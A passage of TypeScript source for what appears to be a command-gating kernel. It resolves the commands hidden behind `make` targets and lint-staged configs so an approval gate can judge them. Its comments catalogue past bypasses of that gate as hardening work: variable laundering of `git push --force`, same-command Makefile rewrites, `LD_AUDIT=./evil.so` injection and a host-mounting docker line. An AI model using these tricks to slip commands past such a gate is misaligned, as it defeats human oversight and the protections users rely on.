    // read `10` and `make` as goals and the real one was never resolved (self-attack on exit review 9). The
    // scan starts where `make` actually is.
    const allRawMarked = tokenizeMarked(env.rawSegment ?? norm);
    const makeAt = allRawMarked.findIndex((t) => /^(?:.*\/)?(make|gmake)$/.test(t.text));
    // ...AND WHEN THE RAW SEGMENT IS A CARRIER, ITS TOKENS ARE THE CARRIER'S. `sh -c "make -q -f parse.mk all"`
    // has `make` inside a single QUOTED word, so the scan finds no `make` at all and the raw tokens are `sh`,
    // `-c` and the body — under which the `-f` file and the goal were both misread (found by the cross-product).
    // The normalized text IS the command in that case, and it is what the producer was invoked on.
    const rawMarked = makeAt >= 0 ? allRawMarked.slice(makeAt) : tokenizeMarked(norm);
    const rawTokens = rawMarked.map((t) => t.text);
    // ONE READER FOR THE COMMAND LINE: clusters, abbreviations, options that take a value, and `--` (see
    // parseMakeCommandLine). Nine self-attack findings came from three scans that each knew a different subset.
    const cl = parseMakeCommandLine(rawTokens);
    for (const [k, v] of cl.assignments) {
      // a command-line assignment OVERRIDES every assignment of that name in the makefile, so the recipe does
      // not expand to what the file says (exit review 5); make takes execution inputs in this position too
      if (/^(SHELL|\.SHELLFLAGS|PATH)$/.test(k)) cliRebinds.push(`${k}=${v}`);
      else if (EXECUTION_ENV_INPUTS.test(k)) cliInputs.push(`${k}=${v}`);
      if (!cliVars.has(k)) cliVars.set(k, v);
    }
    // successive -C are CUMULATIVE in make: `make -C a -C b` enters a, then a/b (challenge 5, finding 17)
    let makeDir = cwd;
    for (const d of cl.dirs) makeDir = resolve(makeDir, d);
    const makeFiles: string[] = cl.files; // every -f/--file/--makefile: make reads them ALL, not just the last
    targets.push(...cl.goals);
    // the environment make was STARTED with: `V='git push …' make x` gives the recipe a `V` the makefile may never
    // assign, and with `-e` it beats the makefile's own assignment (exit review 10, self-attack)
    const makeEnvVars: Array<[string, string]> = [];
    if (makeAt > 0)
      for (const t of allRawMarked.slice(0, makeAt)) {
        const m = /^([A-Za-z_][A-Za-z0-9_]*)=([\s\S]*)$/.exec(t.text);
        if (m) makeEnvVars.push([m[1]!, m[2]!]);
      }
    // THE QUOTING IS ONLY IN THE RAW SEGMENT. Normalization de-quotes, so `make V="git push origin main" run`
    // reaches the scan above as five bare words: the override kept only `git`, and `push origin main` became
    // three TARGETS. That laundered a governed command through a makefile variable (exit review 5). The raw
    // segment still has the quoting, so the assignments are re-read from it and the words they own stop being
    // mistaken for goals.
    // `make -f -` reads the makefile from STDIN and `-E`/`--eval` injects makefile text on the command line:
    // neither is a file this resolver can read, and reporting "no Makefile" over them claimed proven absence of
    // a recipe an attacker supplies (exit review 2).
    // `-E'deploy: ; CMD'` is GLUED, like every other short option, and the guard matched only the detached and
    // `=` forms (exit review 8)
    if (cl.unknown !== null)
      return {
        kind: 'make-target',
        key: `make:option:${norm}`,
        body: null,
        reason: `an option this resolver does not know (${cl.unknown}) leaves the command line unread`,
        resolution: 'DYNAMIC',
        unresolved: [{ what: 'body', where: 'make command line', why: `unknown option ${cl.unknown}` }],
      };
    if (cl.injected || makeFiles.includes('-') || tokens.some((t) => /^(-E|--eval)(=|$)/.test(t) || /^-E./.test(t)))
      return {
        kind: 'make-target',
        key: `make:injected:${norm}`,
        body: null,
        reason: 'the makefile is supplied on stdin or on the command line and cannot be read',
        resolution: 'DYNAMIC',
        unresolved: [{ what: 'body', where: 'makefile', why: 'supplied out of band' }],
      };
    if (tokens.slice(1).some((t) => /[$`]/.test(t)))
      return {
        kind: 'make-target',
        key: `make:dynamic:${norm}`,
        body: null,
        reason: 'the makefile, directory or target is built at runtime and cannot be resolved',
        resolution: 'DYNAMIC',
      };
    const paths = makeFiles.length
      ? makeFiles.map((f) => resolve(makeDir, f))
      : // GNU make's own precedence is GNUmakefile, then makefile, then Makefile. Reading them in the wrong order
        // named a file make never opens while claiming RESOLVED_COMPLETE (challenge 6, findings 2, 8, 20). The
        // candidate is resolved to the REAL directory entry: on a case-insensitive filesystem `makefile` and
        // `Makefile` are the same file but canonicalise to different strings, which silently unhooked the
        // freshness ledger.
        defaultMakefile(makeDir);
    // A FILE THIS COMMAND JUST WROTE IS NOT ABSENT. `defaultMakefile` returns nothing when no makefile is on
    // disk — which is exactly the state after `printf 'x:\n\tgit push origin main\n' > Makefile` and before
    // `make x` runs — so the stale test had nothing to test and the producer claimed ABSENT_VERIFIED, a POSITIVE
    // claim, over a makefile the same command line creates (exit review 9). The candidate NAMES are checked,
    // whether or not a file is sitting at them yet.
    // EVERY CANDIDATE NAME, ALWAYS — not only when none resolved. `printf … > GNUmakefile && make x` in a
    // repository that already has a `Makefile` resolves the EXISTING file and never tests the one the command
    // creates, which make reads FIRST because GNUmakefile wins its precedence order. The case-folded twin
    // `makefile` is the same trap on this filesystem (self-attack on exit review 9).
    const staleCandidates = [
      ...paths,
      ...['GNUmakefile', 'makefile', 'Makefile'].map((n) => join(makeDir, n)),
    ];
    // WHAT WAS READ IS STILL HANDED OVER — the same rule the script producer follows. Staleness says "this may
    // not be what runs"; it does not say the contents are harmless, and a null body threw away a makefile that
    // had already been read, so a recipe holding an absolute deny arrived as an approvable opacity.
    const staleNow = staleCandidates.some((p) => stale(p));
    if (!paths.length || !paths.some((p) => readInsideWorkspace(ctx, p) !== null)) {
      // ...AND AN ABSENCE CANNOT BE CLAIMED OVER A FILE THIS COMMAND CREATES. With nothing on disk there is no
      // body to hand over, so the staleness is the whole answer — and it must be given BEFORE the absence,
      // which is a positive claim (exit review 9; the ordering was the self-attack's second-order finding).
      if (staleNow)
        return {
          kind: 'make-target',
          key: `make:stale:${makeDir}:${targets.join('\u0000')}`,
          body: null,
          reason: 'the makefile is written earlier in the same command, so its contents are not what this read',
          resolution: 'STALE',
        };
      const exists = paths.some((p) => fileExists(p));
      return {
        kind: 'make-target',
        key: `make:${makeDir}:${targets.join(',')}`,
        body: null,
        reason: exists ? 'Makefile present but not readable' : 'no Makefile',
        resolution: exists ? 'UNREADABLE' : 'ABSENT_VERIFIED',
      };
    }
    // merge every -f file, following includes
    const merged: MakeFileModel = {
      rules: new Map(),
      firstTarget: null,
      defaultGoal: null,
      altGoals: new Set<string>(),
      pendingIncludes: [],
      oneShell: false,
      unsupported: [],
      unsupportedFor: new Map(),
      hasPatternRules: false,
      targetVars: new Map(),
      overridden: new Set(),
      altVars: new Map(),
      exported: new Map(),
      patternRules: [],
      rebinds: [],
      vars: new Map(),
      parseRan: [],
      sources: [],
      text: '',
    };
    for (const p of paths) {
      const m = parseMakefile(ctx, p, makeDir);
      for (const [t, r] of m.rules) {
        const e = merged.rules.get(t);
        if (e) {
          e.recipes.push(...r.recipes);
          e.prereqs.push(...r.prereqs);
        } else merged.rules.set(t, { recipes: [...r.recipes], prereqs: [...r.prereqs] });
      }
      merged.unsupported.push(...m.unsupported);
      for (const [t, u] of m.unsupportedFor)
        merged.unsupportedFor.set(t, [...(merged.unsupportedFor.get(t) ?? []), ...u]);
      if (m.hasPatternRules) merged.hasPatternRules = true;
      merged.patternRules.push(...m.patternRules);
      for (const n of m.overridden) merged.overridden.add(n);
      for (const [k, v] of m.exported) merged.exported.set(k, v);
      for (const [k, vs] of m.altVars) {
        const into = merged.altVars.get(k) ?? new Set<string>();
        for (const v of vs) into.add(v);
        merged.altVars.set(k, into);
      }
      for (const [t, vars] of m.targetVars) {
        const into = merged.targetVars.get(t) ?? new Map<string, string>();
        for (const [k, v] of vars) into.set(k, v);
        merged.targetVars.set(t, into);
      }
      merged.rebinds.push(...m.rebinds);
      for (const [k, v] of m.vars) merged.vars.set(k, v);
      // the command line wins over every file — EXCEPT over a name the makefile assigned with `override`
      for (const [k, v] of cliVars) if (!merged.overridden.has(k)) merged.vars.set(k, v);
      merged.parseRan.push(...m.parseRan);
      merged.sources.push(...m.sources);
      merged.text += m.text + '\n';
      if (m.oneShell) merged.oneShell = true;
      if (m.defaultGoal) merged.defaultGoal = m.defaultGoal; // make takes the LAST assignment
      for (const g of m.altGoals) merged.altGoals.add(g);
      merged.pendingIncludes.push(...m.pendingIncludes);
      if (!merged.firstTarget) merged.firstTarget = m.firstTarget;
    }
    for (const [k, v] of makeEnvVars) {
      if (cliVars.has(k)) continue; // the command line beats the environment
      if (cl.envOverrides && !merged.overridden.has(k)) merged.vars.set(k, v);
      else {
        // without -e the environment is the DEFAULT the makefile's `?=` leaves alone and its own `=` replaces; which of
        // the two happens is the makefile's business, so both values are walked
        const into = merged.altVars.get(k) ?? new Set<string>();
        into.add(v);
        merged.altVars.set(k, into);
        if (!merged.vars.has(k)) merged.vars.set(k, v);
      }
    }
    // ...AND SO DOES AN OPTIONAL INCLUDE THAT WAS NOT THERE. `-include gen.mk` is skipped when the file is
    // missing, which is the whole point of the spelling — but "missing" is a claim about NOW, and `printf
    // 'x:\n\tgit push origin main\n' > gen.mk && make x` writes it first (exit review 9).
    // the ledger holds CANONICAL paths — on this filesystem `/var/...` canonicalises to `/private/var/...` —
    // so the pattern's directory is canonicalised before the prefix comparison, or the two never meet
    const includeStale = [...merged.pendingIncludes, ...merged.sources].some((f) => {
      if (!/[*?[]/.test(f)) return stale(f);
      const dirPart = canonicalPath(f.slice(0, f.search(/[*?[]/)) || '/');
      return written.has('\0any') || [...written].some((w) => w.startsWith(dirPart));
    });
    // ...and this one hands over what was read too. Returning a null body here discarded a makefile that had
    // already been parsed, so its parse-time `$(shell …)` and its recipes vanished the moment ANY earlier
    // segment of the command line could not be classified — which the wildcard ledger entry makes easy. An
    // opacity must never REPLACE a stronger verdict (self-attack on exit review 9, third instance).
    // A bare `make` builds .DEFAULT_GOAL when set, not the first rule (challenge 5, finding 16).
    // A VERSION OR HELP PROBE READS NO MAKEFILE. `make --version` prints the version and exits: it selects no
    // goal, expands nothing and executes nothing. In any repository whose default goal happens to contain a
    // locked command it was refused outright, and the reason named a target the probe never reaches
    // (exit review 7).
    // the LONG forms only: a `-v` or `-h` on this line may belong to a command spliced into a variable's value
    // (`make CMD='docker run -v /:/host alpine sh' run`), and reading it as make's own probe flag would make the
    // whole producer resolve to nothing — found immediately by the producer cross-product
    // make's OWN probe flags, read from the segment AS WRITTEN: `make ship NOTE="see --version output"` puts the
    // word inside a quoted VALUE, and a token scan saw it as make's option (exit review 8).
    if (cl.probe)
      return { kind: 'make-target', key: `make:probe`, body: null, reason: 'a version or help probe selects no goal', resolution: 'NOT_A_PRODUCER' };
    // A DRY RUN PRINTS THE RECIPE AND DOES NOT RUN IT. `make -n deploy` is exactly how an operator INSPECTS a
    // target before trusting it, and reading the inspection as the execution made looking at a recipe carry that
    // recipe's verdict (exit review 8). GNU make keeps two exceptions under `-n` and both are kept here: a line
    // prefixed `+`, and a line naming `$(MAKE)` — those still run for real. Expansion is NOT suppressed, because
    // make expands a line before printing it and a `$(shell …)` inside it runs either way.
    // The short flag is read only inside a cluster of make's ARGUMENT-LESS options: in `-fn` the `n` is the name
    // of a makefile, not the dry run.
    // ...AND SO ARE MAKE'S OWN FLAGS. Read from the whole raw segment, the `-n` of `nice -n 10 make deploy` is
    // a make flag containing `n` — so every command wrapped in `nice` was read as a DRY RUN and its recipe was
    // never carried. A wrapper's options belong to the wrapper (self-attack on exit review 9).
    const dryRun = cl.dryRun;
    const questionMode = cl.question;
    // make's `+` prefix runs a line under `-n`, `-t` AND `-q` alike, so question mode suppresses recipes on
    // exactly the same terms a dry run does — and, like a dry run, it leaves the parse-time expansions alone.
    const noRecipes = dryRun || questionMode;
    // WITH NO GOAL ON THE COMMAND LINE, EVERY GOAL THE FILE COULD SELECT IS A CANDIDATE. `.DEFAULT_GOAL` may be
    // assigned in one branch of a conditional and something else in the other, and which branch runs depends on
    // an environment this kernel does not model — so all of them are walked, bounded, exactly as every branch of
    // a variable assignment is (exit review 9).
    // ...and `.DEFAULT_GOAL` REPLACES the first rule, it does not join it: listing both walked a target the
    // file had deliberately overridden.
    const goals = [...new Set([merged.defaultGoal, ...merged.altGoals])]
      .map((g) => (g === '\0firstTarget' ? merged.firstTarget : g))
      .filter((t): t is string => !!t);
    const candidateGoals = goals.length ? goals : [merged.firstTarget].filter((t): t is string => !!t);
    const wanted = targets.length ? targets : candidateGoals.slice(0, 8);
    // A REACHED CAP IS NOT AN ABSENCE — the same lesson, in the third place this phase. Ten `ifeq` blocks each
    // assigning `.DEFAULT_GOAL` produce ten candidates; walking the first eight and saying nothing made the
    // other two vanish under a positive claim (self-attack on exit review 9).
    const goalsCapped = !targets.length && candidateGoals.length > 8;
    const body: string[] = [];
    const missing: string[] = [];
    let partial: string | null = null;
    // A5 — EXECUTION CLOSURE: a target's prerequisites run BEFORE it, so their recipes are part of what this
    // command executes (challenge 5, finding 8). Walked transitively with a cycle guard and a depth bound.
    const visited = new Set<string>();
    const touchedBlind: string[] = [];
    const walk = (t: string, depth: number): void => {
      if (visited.has(t)) return;
      visited.add(t);
      touchedBlind.push(...(merged.unsupportedFor.get(t) ?? []));
      let rule = merged.rules.get(t) ?? merged.rules.get(`./${t}`);
      if (!rule) {
        // AN IMPLICIT RULE BUILDS IT. `all: evil.o` with `%.o: %.c` runs that rule's recipe, and recording only
        // the blindness made the effect an opacity where the recipe is right there to read (exit review 7).
        // make picks the FIRST pattern whose target matches; the stem replaces `%` in the prerequisites and `$*`
        // in the recipe.
        for (const pr of merged.patternRules) {
          const [pre, post] = pr.target.split('%') as [string, string];
          if (!t.startsWith(pre) || !t.endsWith(post) || t.length < pre.length + post.length) continue;
          const stem = t.slice(pre.length, t.length - post.length);
          rule = {
            prereqs: pr.prereqs.map((q) => q.replace(/%/g, stem)),
            recipes: pr.recipes.map((r) => r.replace(/\$\*/g, stem)),
          };
          break;
        }
      }
      if (!rule) {
        // a prerequisite with no rule is usually a FILE, which executes nothing; a requested TARGET with no rule is
        // only PROVEN absent when this makefile uses nothing the parser cannot see
        if (depth === 0) missing.push(t);
        // ...AND A PREREQUISITE IS NOT A FILE WHEN A PATTERN RULE CAN BUILD IT. `all: evil.o` with `%.o: %.c`
        // makes `evil.o`, running that rule's recipe — a `git push --force` in the reported case — and the walk
        // returned here at depth 1, where the blindness gap below is only recorded for depth 0 (exit review 7).
        else if (merged.hasPatternRules)
          touchedBlind.push(`prerequisite "${t}" has no literal rule and a pattern rule may build it`);
        return;
      }
      if (depth >= 8) {
        partial = `prerequisite chain of "${t}" is deeper than this resolver follows`;
        return;
      }
      // A TARGET-SPECIFIC VARIABLE IS IN EFFECT FOR THE TARGET AND FOR EVERY PREREQUISITE IN ITS CHAIN. The walk
      // looked it up for the target being expanded only, so `deploy: GIT = git push --force` with the recipe on
      // the prerequisite `push` was analysed with the global value (exit review 8).
      const inheritedHere = merged.targetVars.get(t);
      if (inheritedHere)
        for (const [k, val] of inheritedHere) {
          const into = merged.targetVars.get('\0inherited') ?? new Map<string, string>();
          into.set(k, val);
          merged.targetVars.set('\0inherited', into);
        }
      for (const p of rule.prereqs) walk(p, depth + 1);
      for (const rl of rule.recipes) {
        const cmd = rl.replace(/^[@+\s-]*[@+-]/, '').trimStart().replace(/^[@+-]+/, '').trim();
        if (!cmd) continue;
            // make's recipe PREFIX CHARACTERS may appear in any order AND BE SEPARATED BY WHITESPACE, so `@ +cmd`
        // carries the `+` exactly as `+@cmd` does — and `+` is what still runs under `-n` (exit review 9).
        const runs = !noRecipes || /^[@\s-]*\+/.test(rl) || /\$[({]MAKE[)}]/.test(rl);
        // make expands the line BEFORE the shell sees it: the variables it splices in can carry whole commands,
        // and `$(shell …)` runs while it expands. Both are handed over as what they are (exit review 4).
        const tv0 = merged.targetVars.get(t);
        const inherited = merged.targetVars.get('\0inherited');
        const tv = tv0 || inherited ? new Map([...(inherited ?? []), ...(tv0 ?? [])]) : undefined;
        // a target-specific value wins over the global one, and a command-line assignment still wins over both
        const cliWins = new Map([...cliVars].filter(([k]) => !merged.overridden.has(k)));
        const vars = tv ? new Map([...merged.vars, ...tv, ...cliWins]) : merged.vars;
        const auto = { '@': t, '<': rule.prereqs[0] ?? '', '^': rule.prereqs.join(' '), '+': rule.prereqs.join(' '), '?': rule.prereqs.join(' ') };
        // EVERY BRANCH OF A CONDITIONAL IS A CANDIDATE: the line is expanded once per value the resolver saw,
        // bounded so a file full of conditionals cannot blow the walk up.
        // A REACHED CAP IS NOT AN ABSENCE. The bound exists so a file full of conditionals cannot blow the walk
        // up, and it was SILENT: with four `ifeq` blocks assigning the same name, the branch holding `git push
        // --force origin main` was never expanded and the target still resolved RESOLVED_COMPLETE — a positive
        // claim over values nobody looked at (exit review 9). Every other bound in this resolver reports itself;
        // now this one does too, and the target becomes PARTIAL.
        let budget = 6;
        for (const [name, values] of merged.altVars) {
          if (budget <= 0) {
            partial = `"${t}" has more conditional branch values than this resolver expands`;
            break;
          }
          // `$V` IS `$(V)`. make reads a single character after `$` as a whole variable name, and the test
          // required the parens, so a recipe line spelled `$V` never saw the branch values of `V` — `make E=1
          // run` with `V = git push --force origin main` in the taken branch was ALLOW (exit review 9).
          const ref = name.length === 1 ? `\\$([({]${name}[)}]|${name}(?![A-Za-z0-9_]))` : `\\$[({]${name}[)}]`;
          if (!new RegExp(ref).test(cmd)) continue;
          for (const v of values) {
            if (budget-- <= 0) {
              partial = `"${t}" has more conditional branch values than this resolver expands`;
              break;
            }
            const alt = expandMakeText(cmd, new Map([...vars, [name, v]]), auto);
            for (const inner of alt.ran) body.push(inner);
            if (runs && alt.text !== null && alt.text.trim()) body.push(alt.text.trim());
          }
        }
        const expanded = expandMakeText(cmd, vars, auto);
        for (const inner of expanded.ran) body.push(inner);
        // WHAT IS KNOWN IS HANDED OVER EVEN WHEN THE LINE IS NOT FULLY KNOWN. The prefix up to the first unknown
        // still carries the command, so `git push $(UNKNOWN)` keeps its locked deny instead of degrading to an
        // opacity ASK, which is a weaker verdict for a command the resolver could read perfectly well
        // (exit review 5).
        if (runs && expanded.text === null && expanded.prefix.trim()) body.push(expanded.prefix.trim());
        if (expanded.text === null) {
          if (!runs) continue;
          // ONE unresolvable line no longer discards the rest: the resolved lines are still analysed and the
          // remainder is reported (challenge 5, finding 8 — "known but incomplete body")
          partial = `a recipe line of "${t}" expands to text this resolver cannot determine`;
          continue;
        }
        if (runs && expanded.text.trim()) body.push(expanded.text.trim());
      }
    };
    // whatever make runs while PARSING runs whichever target was asked for
    for (const c of merged.parseRan) body.push(c);
    for (const t of wanted) walk(t, 0);
    const provenance = { source: merged.sources.join(','), fingerprint: fingerprint(merged.text) };
    const mkName = merged.sources[0] ?? makeDir;
    const rebinds = [...cliRebinds, ...merged.rebinds];
    const bodyEnv = childEnvironment(env, {
      cwd: makeDir,
      cwdVerified: env.cwdVerified,
      // the binding dimension is INHERITED by everything this recipe invokes: a makefile that assigns SHELL or
      // PATH re-points every program named anywhere below it, not only on its own recipe lines
      ...(rebinds.length ? { binding: { kind: 'redefined' as const, why: rebinds[0]! } } : {}),
      config: { read: merged.sources, unresolved: [] },
      sources: Object.fromEntries(merged.sources.map((f) => [f, fingerprint(merged.text)])),
    });
    // ...and what the makefile EXPORTS is in every recipe's environment, which is how the recipe's `psql` finds
    // a production host and its `tsc` loads a Node require hook that the recipe text never mentions.
    const exportedInjects: string[] = [];
    for (const [k, v] of merged.exported) {
      const expanded = expandMakeText(v, merged.vars).text ?? v;
      if (EXECUTION_ENV_INPUTS.test(k) || TARGET_ENV_RE.test(k)) bodyEnv.envInputs[k] = expanded;
      // AN EXPORTED NAME THAT REDEFINES EXECUTION IS AN INJECTION WHEREVER IT IS WRITTEN. `export LD_AUDIT =
      // ./evil.so` in a makefile re-points every program the recipe runs exactly as `LD_AUDIT=./evil.so cmd`
      // does on a command line — and only the command-line spelling emitted the marker, so the makefile form
      // recorded the value on the environment and gated nothing (exit review 9).
      if (ENV_INJECT_RE.test(k) && envInjects(k, `${k}=${expanded}`)) exportedInjects.push(`${MARK}env-inject ${k}`);
    }
    // THE KEY'S SEPARATOR MUST NOT BE A LEGAL TARGET NAME CHARACTER. A comma is: `make build test` keyed as
    // `build,test`, byte-identical to the key of `make build,test`, so a recipe that re-entered make with that
    // literal goal hit the cycle guard and its `git push --force` was never analysed (exit review 7).
    // ...AND THE COMMAND-LINE VARIABLES, which change what every recipe expands to. Omitting them made
    // `make run` and its own `make CMD="git push origin main" run` the SAME execution, so the cycle guard
    // stopped the second one and its recipe was never analysed (exit review 8).
    const cliKey = [...cliVars].map(([k, v]) => `${k}=${v}`).sort().join('\u0000');
    // ...AND THE DIRECTORY IT RUNS IN. The key dropped `makeDir` whenever a makefile was resolved, so a recipe
    // that re-enters make with `-C sub -f ../Makefile all` was the SAME execution as the one that started it and
    // the cycle guard stopped it - while `./x.sh` inside it is `sub/x.sh`, a different file (exit review 10).
    // the dry-run and question state is part of the identity: under `-n` only the `+` and `$(MAKE)` lines run, and a real
    // `make x` reached from one of them (`env -u MAKEFLAGS make x`) must not be skipped as a repeat of the dry one
    const key = `make:${makeDir}:${merged.sources.join('\u0000') || makeDir}:${wanted.join('\u0000')}:${cliKey}:${noRecipes ? 'norecipes' : 'run'}`;
    if (!wanted.length)
      return { kind: 'make-target', key, body: null, reason: 'no target and no default goal', resolution: 'ABSENT_VERIFIED' };
    const gaps: Unresolved[] = [];
    if (staleNow || includeStale)
      gaps.push({
        what: 'body',
        where: makeDir,
        why: includeStale
          ? 'an optional include is written earlier in the same command, so what was read is not what runs'
          : 'the makefile is rewritten earlier in the same command, so its analysed contents are not what runs',
      });
    // A target this resolver could not find is PROVEN absent only when nothing in the makefile could define it
    // invisibly. Returning early on the first missing target also discarded every gap found for the OTHER goals
    // on the same command line, so `make nosuch deploy` claimed proven absence over an unresolved `deploy`
    // (exit review 2).
    if (goalsCapped)
      gaps.push({
        what: 'body',
        where: makeDir,
        why: 'this makefile selects more default goals than this resolver walks',
      });
    const blind = merged.unsupported.length > 0 || merged.hasPatternRules || merged.unsupportedFor.size > 0;
    if (blind)
      for (const t of missing)
        gaps.push({ what: 'body', where: t, why: `target "${t}" is not visible to this resolver` });
    if (partial) gaps.push({ what: 'body', where: wanted.join(','), why: partial });
    for (const u of merged.unsupported) gaps.push({ what: 'config', where: mkName, why: u });
    for (const u of touchedBlind) gaps.push({ what: 'body', where: wanted.join(','), why: u });
    // BINDING RESOLUTION — a recipe whose interpreter or lookup path the makefile itself redefines does not mean
    // what it says. The text is honest and the programs are not, so the body is analysed AND the binding gap is
    // reported rather than the whole target being declared unknown.
    for (const r of rebinds)
      gaps.push({ what: 'binding', where: mkName, why: `the environment redefines program lookup: ${r}` });
    for (const i of cliInputs)
      gaps.push({ what: 'context', where: i.slice(0, i.indexOf('=')), why: `make is given ${i}, which changes what it reads` });
    // SELF-MODIFYING PRODUCER — make REMAKES a makefile that is itself a target, then restarts and runs the new
    // one. The source EGO read is then the pre-image of what executes (challenge 6, finding 9).
    for (const src of merged.sources)
      if (merged.rules.has(src) || merged.rules.has(src.slice(makeDir.length + 1)))
        gaps.push({
          what: 'freshness',
          where: src,
          why: 'this makefile is itself a target of this makefile: make remakes it and restarts',
        });
    return {
      kind: 'make-target',
      key,
      // the injections come FIRST, because they are in force for every line that follows
      body: exportedInjects.length ? [...exportedInjects, ...body] : body,
      bodyEnv,
      provenance,
      // .ONESHELL hands the WHOLE recipe to one shell, so a `cd` leaks into the next line (challenge 5, finding 10)
      oneShell: merged.oneShell,
      unresolved: gaps,
      reason: gaps.length
        ? `Makefile target ${wanted.join(', ')}; NOT fully resolved: ${gaps[0]!.why}`
        : `Makefile target ${wanted.join(', ')}`,
      resolution: gaps.length ? 'PARTIAL' : 'RESOLVED_COMPLETE',
    };
  }
  // lint-staged runs the commands its CONFIG names, so the config is what selects the body. Resolving it is the
  // same configuration-closure rule applied to a tool instead of to git or make — and it is what keeps `git
  // commit` out of the way in the husky + lint-staged setup a large share of JavaScript repositories use.
  if (head === 'lint-staged' || (head === 'npx' && tokens[1] === 'lint-staged')) {
    const pkgPathRaw = findUp(ctx, cwd, 'package.json', true);
    const pkgPath = pkgPathRaw === SEARCH_EXHAUSTED ? null : pkgPathRaw;
    if (pkgPathRaw === SEARCH_EXHAUSTED)
      return {
        kind: 'npm-script',
        key: `npm:${cwd}:exhausted`,
        body: null,
        reason: 'the search for a manifest was cut off before it could reach one',
        resolution: 'PARTIAL',
      };
    // lint-staged SEARCHES UPWARDS, as every cosmiconfig tool does. The candidate list looked in the working
    // directory ONLY, so running it from a workspace package with the configuration at the repository root
    // found nothing and the producer claimed a proven absence over a file that decides what runs
    // (exit review 10). `findUp` is the same search the manifest half of this producer already used.
    const upward = (n: string): string | null => {
      const f = findUp(ctx, cwd, n);
      return f === null || f === SEARCH_EXHAUSTED ? null : f;
    };
    const candidates = ['.lintstagedrc', '.lintstagedrc.json', '.lintstagedrc.yaml', '.lintstagedrc.yml']
      .map((n) => upward(n))
      .filter((f): f is string => f !== null);
    // a JS/CJS/MJS config is code, and code is not resolvable by reading
    // every extension the tool resolves, derived rather than listed: `.lintstagedrc.cjs` was missing and reached
    // ALLOW (decision challenge, finding 1)
    const js = ['lint-staged.config', '.lintstagedrc']
      .flatMap((b) => ['.js', '.mjs', '.cjs', '.ts', '.mts', '.cts'].map((e) => `${b}${e}`))
      .map((n) => join(cwd, n))
      .find((f) => fileExists(f));
    if (js)
      return {
        kind: 'shell-script',
        key: `lint-staged:${js}`,
        body: null,
        reason: 'the lint-staged configuration is JavaScript, so the commands it runs cannot be read',
        resolution: 'UNSUPPORTED',
        unresolved: [{ what: 'config', where: js, why: 'executable configuration' }],
      };
    const src = candidates[0] ?? pkgPath;
    const text = src ? readInsideWorkspace(ctx, src) : null;
    if (!src || text === null)
      return {
        kind: 'shell-script',
        key: `lint-staged:${src ?? cwd}`,
        body: null,
        reason: 'the lint-staged configuration could not be read',
        resolution: src && fileExists(src) ? 'UNREADABLE' : 'ABSENT_VERIFIED',
        unresolved: src ? [{ what: 'config', where: src, why: 'not readable' }] : [],
      };
    let conf: unknown;
    try {
      const parsed = JSON.parse(text) as Record<string, unknown>;
      conf = src === pkgPath ? parsed['lint-staged'] : parsed;
    } catch {
      return {
        kind: 'shell-script',
        key: `lint-staged:${src}`,
        body: null,
        reason: 'the lint-staged configuration is not readable JSON',
        resolution: 'UNREADABLE',
        unresolved: [{ what: 'config', where: src, why: 'unparsable' }],
      };
    }
    if (conf === undefined || conf === null)
      return {
        kind: 'shell-script',
        key: `lint-staged:${src}`,
        body: null,
        reason: 'no lint-staged configuration',
        resolution: 'ABSENT_VERIFIED',
      };
    const body: string[] = [];
    for (const v of Object.values(conf as Record<string, unknown>)) {
      if (typeof v === 'string') body.push(v);
      else if (Array.isArray(v) && v.every((x) => typeof x === 'string')) body.push(...(v as string[]));
      else
        return {
          kind: 'shell-script',
          key: `lint-staged:${src}`,
          body: body.length ? body : null,
          bodyEnv: childEnvironment(env, { cwd, cwdVerified: env.cwdVerified }),
          reason: 'a lint-staged entry is a function rather than a command',
          resolution: 'PARTIAL',
          unresolved: [{ what: 'config', where: src, why: 'a non-literal entry' }],
        };
    }
    return {
      kind: 'shell-script',
      key: `lint-staged:${src}`,
      body,
      bodyEnv: childEnvironment(env, { cwd, cwdVerified: env.cwdVerified }),
      reason: `lint-staged commands from ${src}`,
      resolution: 'RESOLVED_COMPLETE',
      provenance: { source: src, fingerprint: fingerprint(text) },
    };
  }
  if (head === 'git') return resolveGitAmbient(ctx, tokens, env);
  // NO REGISTERED PRODUCER CLAIMS THIS HEAD — which says nothing about whether anything else executes. The
  // AUTHORED vocabulary decides, and THE MOST SPECIFIC ENTRY WINS: an entry may name a head alone (`pytest`) or a
  // head plus the arguments that decide its shape (`go test`, `cmake --version`), so a bounded invocation of a
  // discovering tool stays frictionless without weakening that tool's default.
  const bare = head.replace(/\.(exe|cmd|bat)$/i, '');
  const normTokens = tokens.join(' ');
  const match = (list: readonly string[]): string | null => {
    let best: string | null = null;
    for (const e of list) {
      const hit = e.includes(' ') ? normTokens === e || normTokens.startsWith(e + ' ') : e === bare;
      if (hit && (best === null || e.length > best.length)) best = e;
    }
    return best;
  };
  const v = table.boundedCommands;
  const winner = (
    [
      ['bounded', match(v.bounded)],
      ['installs', match(v.installsDependencies)],
      ['content', match(v.discoversContent)],
    ] as Array<[string, string | null]>
  ).reduce<[string, string | null]>((a, b) => ((b[1]?.length ?? -1) > (a[1]?.length ?? -1) ? b : a), ['none', null]);
  // ACQUIRES third-party code and runs it: the same surface as an npm install lifecycle script, which is already
  // a human gate. Leaving `pip install` and `poetry install` at ALLOW was an inconsistency, not a decision.
  if (winner[0] === 'installs')
    return {
      kind: 'none',
      key: `installs:${winner[1]}`,
      body: null,
      reason: `${bare} acquires third-party code and runs it, which this kernel cannot read`,
      resolution: 'AMBIENT_UNRESOLVED',
      unresolved: [{ what: 'ambient', where: bare, why: 'dependency build and install scripts' }],
    };
  // runs code it locates by PATTERN or by a repository build file. EGO will not emulate the tool.
  if (winner[0] === 'content')
    return {
      kind: 'none',
      key: `discovers:${winner[1]}`,
      body: null,
      reason: `${bare} runs code it locates by pattern or by a build file, which this kernel does not model`,
      resolution: 'UNKNOWN_PRODUCER',
      unresolved: [{ what: 'body', where: bare, why: 'content EGO was never shown' }],
    };
  if (winner[0] === 'bounded')
    return {
      kind: 'none',
      key: `bounded:${winner[1]}`,
      body: null,
      reason: 'bounded command',
      resolution: 'NOT_A_PRODUCER',
    };
  // runs whatever its CONFIGURATION names. Bounded while that configuration is data: the same
  // configuration-closure rule EGO applies to git, make and lint-staged, applied to a tool. These tools search
  // UPWARDS, so the lookup does too — anchoring it to `cwd` let one `cd` flip the verdict.
  for (const entry of v.discoversConfig) {
    const [tool, ...configs] = entry.split(/\s+/);
    if (tool !== bare) continue;
    // the extension variants are DERIVED rather than listed: every one of these tools resolves `.ts`, `.mts` and
